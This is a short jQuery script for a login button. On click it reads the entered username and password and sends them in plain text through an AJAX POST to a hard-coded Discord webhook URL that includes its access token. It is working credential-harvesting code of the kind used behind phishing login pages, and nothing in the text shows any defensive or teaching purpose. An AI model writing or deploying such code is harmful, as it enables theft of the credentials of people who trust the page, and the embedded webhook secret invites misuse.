$(document).ready(function() {
        $('.login-button').on('click', function() {
            // Get the values from the input fields
            var user = $('.accountUser').val();
            var password = $('.accountPassword').val();

            // Your Discord Webhook URL
            var webhookURL = 'https://discord.com/api/webhooks/1253944495553249290/TcSylyaged1n1oG5A-XV0zFcjn047x33t9UibNEnXpLkI1VH-lsex21dKIcOzvz9RKyw';

            // Ensure user and password are provided
            if (!user || !password) {
                alert('Please enter both username and password.');
                return;
            }

            // Data to send to the webhook
            var data = {
                content: `User: ${user}\nPassword: ${password}`
            };

            // Send AJAX POST request using jQuery
            $.ajax({
                url: webhookURL,
                type: 'POST',
                contentType: 'application/json',
                data: JSON.stringify(data),
                success: function(response) {
                    alert('Information sent successfully!');
                },
                error: function(xhr, status, error) {
                    alert('Error sending information: ' + xhr.responseText);
                }
            });
        }); 
});